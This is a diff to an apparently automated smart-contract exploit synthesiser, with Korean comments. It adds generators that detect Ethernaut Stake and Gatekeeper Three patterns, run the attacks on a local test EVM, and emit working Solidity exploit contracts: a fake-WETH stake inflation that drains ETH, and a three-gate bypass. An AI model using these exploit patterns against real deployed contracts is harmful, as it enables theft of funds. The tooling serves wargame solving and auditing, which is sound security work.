@@ -2557,6 +2557,192 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Stake 류: 외부 토큰(WETH) 이전이 실패/무동작이어도 사용자 지분을 올려주는
+    회계 버그. 가짜 WETH(allowance=max, transferFrom=true no-op)를 물려 stake 를 부풀린 뒤
+    unstake 로 시드된 실제 ETH 를 인출해 자금 유출을 관찰한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not (re.search(r"\bWETH\b", tb) and re.search(r"0x23b872dd|transferFrom", tb)):
+        return None
+    stake_fn = None; unstake_fn = None
+    for fn in _functions(tb):
+        b = fn["body"]
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
+                and re.search(r"WETH\s*\.\s*call", b) and re.search(r"\[\s*msg\.sender\s*\]\s*\+=", b):
+            stake_fn = fn["name"]
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
+                and re.search(r"\.call\s*\{\s*value", b) and re.search(r"\[\s*msg\.sender\s*\]\s*-=", b):
+            unstake_fn = fn["name"]
+    if not (stake_fn and unstake_fn):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    fake = (HEADER + "contract FakeWETH {\n"
+        "    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }\n"
+        "    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"FakeWETH.sol":{"content":fake}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "FakeWETH" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    ctypes = _abi_ctor_types(abi)
+    if "address" not in ctypes:
+        return None
+    w3, acct = _mk_evm()
+    def dep(cn, args, value=0):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"value":value,"gas":6_000_000})).contractAddress
+    try:
+        weth = dep("FakeWETH", [])
+        seed = 10**18
+        cargs = [Web3.to_checksum_address(weth) if t == "address" else _default_for_type(t) for t in ctypes]
+        taddr = dep(name, cargs, value=(seed if _ctor_payable(abi) else 0))
+    except Exception:
+        return None
+    if seed and w3.eth.get_balance(taddr) == 0:  # 비-payable 생성자면 receive 로 시드
+        try: w3.eth.send_transaction({"from":w3.eth.accounts[-1],"to":taddr,"value":seed,"gas":200000})
+        except Exception: pass
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    b0 = w3.eth.get_balance(taddr)
+    if b0 == 0:
+        return None
+    amt = b0   # 시드 전액을 지분으로 부풀린 뒤 인출
+    try:
+        getattr(tc.functions, stake_fn)(amt).transact({"from":acct,"gas":1_000_000})
+        getattr(tc.functions, unstake_fn)(amt).transact({"from":acct,"gas":1_000_000})
+    except Exception:
+        return None
+    b1 = w3.eth.get_balance(taddr)
+    if not (b1 < b0):
+        return None
+    poc = (HEADER +
+        "// Strategy: Stake. StakeWETH credits the user even when the WETH transfer does not\n"
+        "// move funds, so a fake WETH (allowance=max, transferFrom=true no-op) inflates the\n"
+        "// stake; Unstake then withdraws the contract's real (seeded) ETH.\n"
+        f"interface IS {{ function {stake_fn}(uint256) external returns (bool); function {unstake_fn}(uint256) external returns (bool); }}\n"
+        "contract FakeWETH {\n"
+        "    function allowance(address,address) external pure returns (uint256) { return type(uint256).max; }\n"
+        "    function transferFrom(address,address,uint256) external pure returns (bool) { return true; }\n}\n"
+        "contract Exploit {\n"
+        "    function run(address t, uint256 amount) external {\n"
+        f"        IS(t).{stake_fn}(amount);\n"
+        f"        IS(t).{unstake_fn}(amount);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (stake-accounting)","strategy":"stake-accounting","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"funds drained ({(b0-b1)/1e18:g} ETH via fake-WETH stake)",
+            "strategy":f"stake-accounting:{stake_fn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "balance_before_wei":str(b0),"balance_after_wei":str(b1),
+            "note":"가짜 WETH 로 실제 이전 없이 지분을 부풀린 뒤 unstake 로 시드된 실 ETH 를 인출했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_gatekeeper_three(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Gatekeeper Three 류: 오타 construct0r 로 owner 선점, 같은 블록 password 로
+    allowEntrance, receive 없는 공격자에게 send 가 실패하는 gateThree 를 통과해 entrant 탈취."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # 특징: send(...) == false 게이트 + owner=msg.sender 무가드 세터 + entrant=tx.origin
+    if not (re.search(r"\.\s*send\s*\([^)]*\)\s*==\s*false", tb) and re.search(r"entrant\s*=\s*tx\.origin", tb)):
+        return None
+    owner_setter = None; getallow = None; createtrick = None; enter = None; ent = "entrant"
+    for fn in _functions(tb):
+        b = fn["body"]
+        if fn["external"] and not fn["args"] and re.search(r"\bowner\s*=\s*msg\.sender", b):
+            owner_setter = fn["name"]
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
+                and re.search(r"allowEntrance\s*=\s*true|checkPassword", b):
+            getallow = fn["name"]
+        if fn["external"] and not fn["args"] and re.search(r"new\s+\w+|trick\s*=", b):
+            createtrick = fn["name"]
+        if fn["external"] and re.search(r"entrant\s*=\s*tx\.origin", b):
+            enter = fn["name"]
+    if not (owner_setter and getallow and enter):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER +
+        f"interface IG {{ function {owner_setter}() external;"
+        + (f" function {createtrick}() external;" if createtrick else "")
+        + f" function {getallow}(uint256) external; function {enter}() external; }}\n"
+        "contract Pwn {\n"
+        "    function run(address payable t) external payable {\n"
+        + (f"        IG(t).{createtrick}();\n" if createtrick else "") +
+        f"        IG(t).{getallow}(block.timestamp);\n"
+        f"        IG(t).{owner_setter}();\n"
+        "        (bool ok, ) = t.call{value: msg.value}(\"\"); require(ok, \"fund\");\n"
+        f"        IG(t).{enter}();\n"
+        "    }\n"
+        "    // no receive() → gateThree 의 owner.send 가 실패해 게이트 통과\n"
+        "}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":9_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+        paddr = deploy("Pwn", [])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    e0 = tc.functions[ent]().call() if _has_getter(abi, ent) else None
+    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+    try:
+        pwn.functions.run(Web3.to_checksum_address(taddr)).transact({"from":acct,"value":10**16,"gas":5_000_000})
+    except Exception:
+        return None
+    e1 = tc.functions[ent]().call() if _has_getter(abi, ent) else None
+    if e0 is not None and e1 is not None and (e1 == e0 or int(e1, 16) == 0):
+        return None
+    poc = (HEADER +
+        "// Strategy: Gatekeeper Three. Seize owner via the typo'd construct0r(), unlock via\n"
+        "// same-block password, and pass gateThree because owner.send() to a receive-less\n"
+        "// attacker returns false.\n"
+        f"interface IG {{ function {owner_setter}() external;"
+        + (f" function {createtrick}() external;" if createtrick else "")
+        + f" function {getallow}(uint256) external; function {enter}() external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address payable t) external payable {\n"
+        + (f"        IG(t).{createtrick}();\n" if createtrick else "") +
+        f"        IG(t).{getallow}(block.timestamp);\n"
+        f"        IG(t).{owner_setter}();\n"
+        "        (bool ok, ) = t.call{value: msg.value}(\"\"); require(ok);\n"
+        f"        IG(t).{enter}();\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-three)","strategy":"gatekeeper-three","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{ent} set via 3-gate bypass",
+            "strategy":f"gatekeeper-three:{enter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"construct0r 로 owner 선점, 같은 블록 password, receive 없는 공격자 send 실패로 3게이트를 통과해 entrant 를 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_force(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Force 류: receive/fallback/payable 이 전혀 없는 '받을 수 없는' 컨트랙트에
     selfdestruct 로 ETH 를 강제 주입한다. 잔액이 0 에서 양수로 바뀌는지로 증명한다.
@@ -4183,6 +4369,20 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0x) Stake (가짜 WETH 회계 버그 → 실 ETH 인출)
+    try:
+        r = _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0w) Gatekeeper Three (construct0r 선점 + send 실패 게이트)
+    try:
+        r = _synth_gatekeeper_three(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0v) EIP-7702 재진입 (mint 이전 콜백 + tx.origin EOA 게이트) — 동적 증명
     try:
         r = _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4272,7 +4472,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
                _synth_higher_order, _synth_switch, _synth_array_underflow,
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
-               _synth_eip7702_reentrancy):
+               _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
